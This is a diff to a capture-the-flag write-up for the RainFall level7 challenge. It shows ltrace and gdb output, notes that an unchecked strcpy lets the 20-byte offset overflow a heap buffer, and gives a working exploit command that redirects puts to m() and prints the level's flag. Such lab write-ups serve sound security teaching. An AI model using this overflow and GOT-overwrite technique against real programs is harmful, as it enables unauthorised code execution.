@@ -1,3 +1,4 @@
+```
 level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAA
 __libc_start_main(0x8048521, 3, 0xbffff774, 0x8048610, 0x8048680 <unfinished ...>
 malloc(8)                                              = 0x0804a008
@@ -10,8 +11,9 @@ strcpy(0x37614136, "AAAAAAAA" <unfinished ...>
 +++ killed by SIGSEGV +++
 
 0x37614136 -> 20
-
-(gdb) disas m
+```
+offset is at 20th 
+```(gdb) disas m
 Dump of assembler code for function m:
    0x080484f4 <+0>:     push   %ebp
    0x080484f5 <+1>:     mov    %esp,%ebp
@@ -35,7 +37,16 @@ Dump of assembler code for function puts@plt:
    0x0804840b <+11>:    jmp    0x80483a0
 End of assembler dump.
 
+```
+the programe use strcpy to copy argv1 and argv2 in char *v5 and char *v6
+strcpy dosnt check the size of src is bigger than dst
 
+if we send a bigger chain than dst we can overwrite adjacent memory, which leads to a buffer overflow.
+
+we can call m() at the jmp of puts 
+./level7 arg1["patern*20" + "address of jmp instruction in puts()"] arg2["address of m()"]
+```
 level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]') 
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1729177096
+```
